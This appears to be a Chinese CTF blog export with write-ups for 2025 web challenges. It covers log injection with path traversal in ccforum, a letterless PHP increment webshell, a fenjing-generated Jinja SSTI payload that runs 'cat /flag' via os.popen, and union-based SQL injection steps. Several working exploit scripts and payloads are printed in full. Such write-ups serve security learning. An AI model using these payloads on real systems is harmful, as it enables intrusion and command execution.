//总结上面的代码就是获取/var/www/action.log给action_log，再用，分割成part // 如果操作类型是记录封禁 if ($action === \u0026#39;record_banned\u0026#39;) { // 如果操作成功 if ($success === 1) { // 将附加信息添加到被封禁用户数组中 $banned_users[$encoded_user][] = $additional_info; } else { // 将附加信息添加到失败日志数组中 $failed_logs[] = $additional_info; } } } //这里要求action==record_banned,success=1,然后进行下面的遍历文件目录的内容全部传给参数， 所以如果构造{$encoded_user}为../../../,就相当与回到根目录，从而可能读到flag // 初始化被封禁内容数组 $banned_contents = []; // 遍历被封禁用户数组 foreach ($banned_users as $encoded_user =\u0026gt; $logs) { // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$encoded_user}\u0026#34;;//构造{$encoded_user}为../../../，之后直接读根目录 // 如果目录存在 if (file_exists($banned_dir)) { // 获取目录中的文件列表 $files = scandir($banned_dir); // 遍历文件列表 foreach ($files as $file) { // 跳过目录本身和父目录 if ($file !== \u0026#39;.\u0026#39; \u0026amp;\u0026amp; $file !== \u0026#39;..\u0026#39;) { // 构造文件路径 $file_path = $banned_dir . \u0026#39;/\u0026#39; . $file; // 读取文件内容 $content = file_get_contents($file_path); // 将内容添加到被封禁内容数组中 $banned_contents[$username][] = $content; } } } } ?\u0026gt; 接下来要知道action.log的内容，所以先看看config.php文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 // 启动会话 session_start(); // 定义数据库连接参数 define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39;); define(\u0026#39;DB_PORT\u0026#39;, \u0026#39;3306\u0026#39;); define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;forum\u0026#39;); define(\u0026#39;DB_USER\u0026#39;, \u0026#39;mgr\u0026#39;); define(\u0026#39;DB_PASS\u0026#39;, \u0026#39;j92wn0UXFYsUAFiN\u0026#39;); try { // 创建PDO实例，连接到MySQL数据库 $pdo = new PDO( \u0026#34;mysql:host=\u0026#34; . DB_HOST . \u0026#34;;port=\u0026#34; . DB_PORT . \u0026#34;;dbname=\u0026#34; . DB_NAME, DB_USER, DB_PASS, [PDO::ATTR_ERRMODE =\u0026gt; PDO::ERRMODE_EXCEPTION] // 设置错误模式为异常 ); } catch (PDOException $e) { // 如果连接失败，输出错误信息并终止脚本 die(\u0026#34;Database connection failed: \u0026#34; . $e-\u0026gt;getMessage()); } // 定义一个函数，用于对用户名进行Base64编码 function encode_uname($username) { return base64_encode($username); } // 定义一个函数，用于记录操作日志 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // 生成唯一的日志ID $log_id = uniqid(); // 对用户名进行编码 $e_username = encode_uname($username); // 格式化日志行 $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // 将日志行追加到操作日志文件中 file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } // 定义一个函数，用于记录封禁操作 function record_banned($username, $banned) { // 对用户名进行编码 $e_username = encode_uname($username); // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // 假设目录创建成功 $created = true; // 如果目录不存在，则尝试创建 if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // 设置目录权限为0750 } // 初始化日志信息和成功状态 $log = \u0026#34;\u0026#34;; $succ = 1; // 如果目录创建失败 if (!$created) { $succ = 0; // 设置成功状态为失败 $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // 记录错误信息 } else { // 构造文件名，使用当前时间戳 $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // 尝试将封禁内容写入文件 if (!file_put_contents($filename, $banned)) { $succ = 0; // 如果写入失败，设置成功状态为失败 $log = \u0026#34;Failed to record banned content\u0026#34;; // 记录错误信息 } } // 调用log_action函数记录封禁操作的日志 log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } // 定义一个函数，用于检查内容是否包含敏感词 function has_sensitive_words($content) { // 定义敏感词列表 $SENSITIVE_WORDS = [\u0026#39;敏感词\u0026#39;, \u0026#39;SENSITIVE WORDS\u0026#39;,]; // 遍历敏感词列表 foreach ($SENSITIVE_WORDS as $word) { // 使用stripos函数（不区分大小写）检查内容中是否包含敏感词 if (stripos($content, $word) !== false) { // 如果找到敏感词，返回true return true; } } // 如果没有找到敏感词，返回false return false; } 首先看log_action函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function log_action($username, $action, $succ, $additional = \u0026#39;\u0026#39;) { // 生成唯一的日志ID $log_id = uniqid(); // 对用户名进行编码 $e_username = encode_uname($username); // 格式化日志行 $log_line = sprintf( \u0026#34;%s,%s,%s,%d,%s\\n\u0026#34;, $log_id, $e_username, $action, $succ, $additional ); // 将日志行追加到操作日志文件中 file_put_contents(\u0026#39;/var/www/action.log\u0026#39;, $log_line, FILE_APPEND); } 看这个代码知道，log_id是唯一生成的，不可控制，e_username被加密，不好控制进行目录穿越，action要=record_banned,success=1，所以只能控制additional(它刚好为空)\n接下来寻找调用action_log的地方，也就是record_banned函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 function record_banned($username, $banned) { // 对用户名进行编码 $e_username = encode_uname($username); // 构造被封禁用户目录路径 $banned_dir = \u0026#34;/var/www/banned/{$e_username}\u0026#34;; // 假设目录创建成功 $created = true; // 如果目录不存在，则尝试创建 if (!file_exists($banned_dir)) { $created = mkdir($banned_dir, 0750); // 设置目录权限为0750 } // 初始化日志信息和成功状态 $log = \u0026#34;\u0026#34;; $succ = 1; // 如果目录创建失败 if (!$created) { $succ = 0; // 设置成功状态为失败 $log = \u0026#34;Failed to create record directory for \u0026#34; . $username; // 记录错误信息 } else { // 构造文件名，使用当前时间戳 $filename = $banned_dir . \u0026#39;/\u0026#39; . time() . \u0026#39;.txt\u0026#39;; // 尝试将封禁内容写入文件 if (!file_put_contents($filename, $banned)) { $succ = 0; // 如果写入失败，设置成功状态为失败 $log = \u0026#34;Failed to record banned content\u0026#34;; // 记录错误信息 } } // 调用log_action函数记录封禁操作的日志 log_action($username, \u0026#39;record_banned\u0026#39;, $succ, $log); } 这里若是想传入/var/www/action.log后想要变量根目录所有文件，必须有某一行满足?(path[0]是id不用管)，../../../,record_banned,1,(path[4]无要求)，第一行是绝对不可能，因为username被base64加密，所以第一行就构造不了../../../（因为没有什么加密后是../../../）,所以就在第二行构造?,../../../,record_banned,1,?。那么就要在log下手了\n这里$log有3种情况，空或Failed to create record directory for \u0026quot; . $username;或\u0026quot;Failed to record banned content\u0026quot;；显然我们要通过构造username这个变量达到目的。所以log=\u0026ldquo;Failed to create record directory for \u0026quot; . $username;要到达这个目的，就要使创建目录失败，mkdir方法不可以创建多级目录，即其中不能包含/字符，也就是说username编码后包含/,恰好???编码后有/\n第二行怎么出来？显然要%0a,那还要满足第二行包括?,../../../,record_banned,? 那很显然了，username=???%0a,../../../,record_banned,1,\n所以写入/var/www/action.log的内容是\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???%0a,../../../,record_banned,1, 经过分行后第一行是\nid,encode_base64(???%0a,../../../,record_banned,1,),record_banned,1,Failed to create record directory for ???\n第二行是,../../../,record_banned,1, 符合要求！\n接下来找调用record_banned的函数，在post.php里\nhas_sensitive_words在config.php里\n显然要符合has_sensitive_words($title) || has_sensitive_words($content)，即让title或content存在敏感词或者 SENSITIVE WORDS\n所以解题思路、\n1.先注册用户username=???\\n,../../../,record_banned,1, password=111111111(任意内容，满足长度就好,手动注册的话\\n要写成%0a)\n2.访问post路由，post传参title或者content\n3.登入管理员账户，进入admin.php,拿到flag（爆破）\n直接打脚本也行，然后直接访问admin.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from requests import Session basic = \u0026#34;http://ip:9090/\u0026#34; data = {\u0026#34;username\u0026#34;: \u0026#34;???\\n,../../../,record_banned,1,\u0026#34;,\u0026#34;password\u0026#34;: \u0026#34;111111111111\u0026#34;,} def register(sess: Session): resp = sess.post(basic + \u0026#34;/register.php\u0026#34;, data=data) def login(sess: Session): resp = sess.post(basic + \u0026#34;/login.php\u0026#34;, data=data) def post(sess: Session): data1 = { \u0026#34;title\u0026#34;: \u0026#34;敏感词\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;tset\u0026#34;, } resp = sess.post(basic + \u0026#34;/post.php\u0026#34;, data=data1) if __name__ == \u0026#34;__main__\u0026#34;: sess = Session() register(sess) login(sess) post(sess) ","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-%E9%95%BF%E5%9F%8E%E6%9D%AF-ccforum/","title":"2025-长城杯-ccforum"},{"content":"ez_php 这题前面简单，不多说\n1 2 post传：a[]=1\u0026amp;b[]=2 get传:?password=123456a 解法一日志包含 接下来我打的是日志包含，算是非预期\n各发包2次哈\n解法二打自增 文件包含读取后，有base64字符（还一个非预期直接/file就能出flag）\n1 file=php://filter/read=convert.base64-encode/resource=level2.php 解码得到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php error_reporting(0); if (isset($_POST[\u0026#39;rce\u0026#39;])) { $rce = $_POST[\u0026#39;rce\u0026#39;]; if (strlen($rce) \u0026lt;= 120) { if (is_string($rce)) { if (!preg_match(\u0026#34;/[!@#%^\u0026amp;*:\u0026#39;\\-\u0026lt;?\u0026gt;\\\u0026#34;\\/|`a-zA-Z~\\\\\\\\]/\u0026#34;, $rce)) { eval($rce); } else { echo(\u0026#34;Are you hack me?\u0026#34;); } } else { echo \u0026#34;I want string!\u0026#34;; } } else { echo \u0026#34;too long!\u0026#34;; } } ?\u0026gt; 这里无字母rce，且过滤了^,~,|,那只能打自增（其实也可以fuzz一下看看可以用哪些）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php // 定义正则表达式 $pattern = \u0026#34;/[a-zA-Z0-9@#%^\u0026amp;*:{}\\-\u0026lt;\\?\u0026gt;\\\u0026#34;|`~\\\\\\\\]/\u0026#34;; // 存储未被过滤的字符 $unfilteredChars = []; // 遍历 ASCII 码从 32 到 127 for ($i = 32; $i \u0026lt;= 127; $i++) { $char = chr($i); // 获取对应的字符 if (!preg_match($pattern, $char)) { // 检查是否未被过滤 $unfilteredChars[] = $char; // 添加到未过滤字符数组 } } // 输出未被过滤的字符 echo \u0026#34;未被过滤的字符: \u0026#34; . implode(\u0026#39;\u0026#39;, $unfilteredChars) . \u0026#34;\\n\u0026#34;; ?\u0026gt; 那显然只能打自增\n自增规则简单，比如$a=\u0026lsquo;A\u0026rsquo;;$a++=\u0026lsquo;B\u0026rsquo;,所以只要一个字母A,我就可以构造一个$_GET,这样就可以给 _ 还有__赋值（这里有数字，但是还是用_,因为我这个照着无数字字母rce打，相当于通用payload），从而到达命令执行的目的,那这个A怎么的得到?\n在php中，数组与字符串连接，会被转换成字符串，值就是Array,那就相对于拿到了所有字母\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $_=[].\u0026#39;\u0026#39;;//Array $_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];//A $_++;//B $_++;//C $_++;//D $_++;//E $__=$_;//E $_++;//F $_++;//G $___=$_;//G $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T $_=$___.$__.$_;//GET //var_dump($_); $_=\u0026#39;_\u0026#39;.$_;//_GET var_dump($$_[_]($$_[__])); //$_GET[_]($_GET[__]) 接下来就可以尝试去给_和__GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样\n1 $_=[].\u0026#39;\u0026#39;;$_=$_[\u0026#39;\u0026#39;==\u0026#39;$\u0026#39;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=\u0026#39;_\u0026#39;.$_;$$_[_]($$_[__]); 然后是\n1 %24_%3D%5B%5D.\u0026#39;\u0026#39;%3B%24_%3D%24_%5B\u0026#39;\u0026#39;%3D%3D\u0026#39;%24\u0026#39;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D\u0026#39;_\u0026#39;.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B 但是这个paylaod不行，因为限制了字符，还是要利用数字，所以应该打$_GET[1] ($_GET[2])\n1 2 3 4 5 6 7 8 9 $_=[]._;//Array $__=$_[1];//r $_=$_[0];//A $_++;//B $_1=++$_;//$_1=C,$_=D(这里是前缀++，即先自增一再赋值) $_++;$_++;$_++;$_++;//$_=H $_=$_1.++$_.$__;//CHr $_=_.$_(71).$_(69).$_(84);//_GET $$_[1]($$_[2]); //$_GET[1]$_GET[2] 1 %24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B%20 这里是118个字符，比较极限，下面更好，只有111字符\n1 2 3 4 5 6 7 8 9 10 11 12 $_=([]._){0}; //A $_++; $_1=++$_; //$_1=C $_++; $_++; $_++; $_++; $_1.=++$_.([]._){1}; //$_1=CHr $_=_.$_1(71).$_1(69).$_1(84); //$_=_GET $$_[1]($$_[2]); //$_GET[1]($_GET[2]) //缩短为一行 $_=([]._){0};$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_1.=++$_.([]._){1};$_=_.$_1(71).$_1(69).$_1(84);$$_[1]($$_[2]); [从CTFShowRCE挑战]中学习自增构造webshell-腾讯云开发者社区-腾讯云\n对于RCE和文件包含的一点总结 | root@wanth3f1ag\n[HNCTF] challenge_rce - Boogiepop Doesn\u0026rsquo;t Laugh\nCoding Loving-ssti 有源码先审计代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from flask import Flask, request, render_template, session, url_for app = Flask(__name__) app.secret_key = \u0026#39;Ciallo～(∠・ω ＜）⌒★\u0026#39; # 设置应用密钥，用于会话加密 # 定义过滤关键词列表 FILTER_KEYWORDS = [\u0026#39;Ciallo～(∠・ω ＜）⌒★\u0026#39;] TIME_LIMIT = 1 # 时间限制，未在代码中使用 # 定义函数，检查输入中是否包含禁止的关键词 def contains_forbidden_keywords(complaint): for keyword in FILTER_KEYWORDS: if keyword.lower() in complaint: # 检查关键词是否在输入中（不区分大小写） return True return False @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # 定义路由 \u0026#39;/\u0026#39;，支持 GET 和 POST 方法 def index(): session[\u0026#39;user\u0026#39;] = \u0026#39;test\u0026#39; # 设置会话中的用户为 \u0026#39;test\u0026#39; command = request.form.get(\u0026#39;cmd\u0026#39;, \u0026#39;coding\u0026#39;) # 获取表单中的 \u0026#39;cmd\u0026#39; 值，默认为 \u0026#39;coding\u0026#39; return render_template(\u0026#39;index.html\u0026#39;, command=command) # 渲染 index.html 模板，传递 command 参数 @app.route(\u0026#39;/test\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) # 定义路由 \u0026#39;/test\u0026#39;，支持 GET 和 POST 方法 def shell(): if session.get(\u0026#39;user\u0026#39;) != \u0026#39;test\u0026#39;: # 检查会话中的用户是否为 \u0026#39;test\u0026#39; return render_template(\u0026#39;Auth.html\u0026#39;) # 如果不是，渲染 Auth.html 模板（可能是登录页面） if (abc := request.headers.get(\u0026#39;User-Agent\u0026#39;)) is None: # 获取 User-Agent 头，如果不存在 return render_template(\u0026#39;Auth.html\u0026#39;) # 返回 Auth.html 模板 cmd = request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;试一试\u0026#39;) # 获取 URL 参数中的 \u0026#39;cmd\u0026#39; 值，默认为 \u0026#39;试一试\u0026#39; if request.method == \u0026#39;POST\u0026#39;: # 如果是 POST 请求 css_url = url_for(\u0026#39;static\u0026#39;, filename=\u0026#39;style.css\u0026#39;) # 生成静态文件 style.css 的 URL command = request.form.get(\u0026#39;cmd\u0026#39;) # 获取表单中的 \u0026#39;cmd\u0026#39; 值 if contains_forbidden_keywords(command): # 检查命令中是否包含禁止的关键词 return render_template(\u0026#39;forbidden.html\u0026#39;) # 如果包含，渲染 forbidden.html 模板 # 使用 render_template_string 渲染一个 HTML 字符串，传递 command 和 css_url 参数 return render_template_string(f\u0026#39;\u0026#39;\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Loving Music\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{css_url}\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;\u0026lt;url id=\u0026#34;cvh0d9sc75rev485mjl0\u0026#34; type=\u0026#34;url\u0026#34; status=\u0026#34;failed\u0026#34; title=\u0026#34;\u0026#34; wc=\u0026#34;0\u0026#34;\u0026gt;https://fonts.googleapis.com/css2?family=Poppins:wght@400\u0026lt;/url\u0026gt; ;600\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Loving coding\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;emoji\u0026#34;\u0026gt;🧑‍💻\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;{command}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39;, command=command, css_url=css_url) return render_template(\u0026#39;shell.html\u0026#39;, command=cmd) # 如果是 GET 请求，渲染 shell.html 模板，传递 cmd 参数 显然这里漏洞点在render_template_string ，这个与ssti密不可分（render_template_string函数在渲染模板的时候使用了%s来动态的替换字符串，在渲染的时候会把 {undefined{**}} 包裹的内容当做变量解析替换。）\nFlask的渲染方法函数\u0026mdash;render_template()/render_template_string()-CSDN博客\n所以就是打ssti(在/test路由，cmd是参数)，先fuzz一下，这些都是没过滤的\n下面是过滤的（下面还一些关键词，那些无所谓，直接引号绕过了），显然，困难的是数字，下划线过滤了，因为下划线过滤了，一般用request加attr，或者编码，但是数字和点过滤了，这让我束手无策。\n那就直接fenjing跑！\n一开始我直接跑fenjing跑不出，一般默认跑fenjing基本跑不出，要根据题目加点参数才行。这个fenjing跑要带路由，cookie，不然跑不出。这里我猜猜原因，这里设置了seesion会话用户是test，后面还进行了验证，所以要带上seesion才行。\nfenjing如果你是pip下载就打\n1 fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST 不然就命令行前加pyhton -m就行\n1 python -m fenjing crack --url http://node6.anna.nssctf.cn:23137/test --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST 然后执行命令就行\n这里给出payload：ls\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x)|count)*(x,x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} cat /flag\n1 cmd={{((cycler[\u0026#39;next\u0026#39;][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;GLOBALS\u0026#39;|lower+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;builtins\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count][lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count+\u0026#39;import\u0026#39;+lipsum|escape|batch(((x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))|list|first|last*(x,x)|count](\u0026#39;os\u0026#39;))[\u0026#39;popen\u0026#39;](((lipsum()|urlencode|first+\u0026#39;c\u0026#39;)*(x,x,x,x,x,x,x,x,x)|count)|format(((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),(((x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count)*(x,x,x,x)|count),((x,x,x,x,x,x,x,x)|count*(x,x,x,x)|count),((x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x,x,x,x)|count),((x,x,x,x,x,x,x,x,x,x,x)|count*(x,x,x,x,x,x,x,x,x)|count+(x,x,x,x)|count))))[\u0026#39;r\u0026#39;\u0026#39;ead\u0026#39;]()}} 总结，fenjing还是很强，以前不会用，以后注意一定要带上参数\nlight_pink-sql 这题是考sql，但是有非预期\n非预期 拿dirsearch扫一下\n1 python dirsearch.py -u http://node6.anna.nssctf.cn:23588/ db.php没有东西，但是shell.php有好东西\n直接有eval了，我这可以直接打一句话木马了！\n但是！这里有phpinfo!,所以我猜测一下可能会有flag，直接搜flag或者nss，发现flag在环境变量\n预期解 预期解显然就是打sql\n先打1'#%23(%23就是#，\u0026ndash;+被过滤了)\n然后试1' order by 5%23(试到6报错)\n然后看看哪有回显，但是报错，原因是-被禁用\n果然-被禁，结果是4是回显\n1 0\u0026#39; union select 1,2,3,4,5%23 接下来找表\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=database()%23 显示不可以哦=，所以应该是**=被过滤，用like代替**\n1 0\u0026#39; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like database()%23 查列\n1 0\u0026#39; union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_name like \u0026#39;Cute\u0026#39;%23 查flag\n1 0\u0026#39; union select 1,2,3,group_concat(Happy),5 from Cute%23 此题过滤了-还有=,但是还是比较友好，毕竟报错还是有提示，是一个不错的sql题\n","date":"2025-03-26T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/nss-round28-web/","title":"nss-round28-web"}]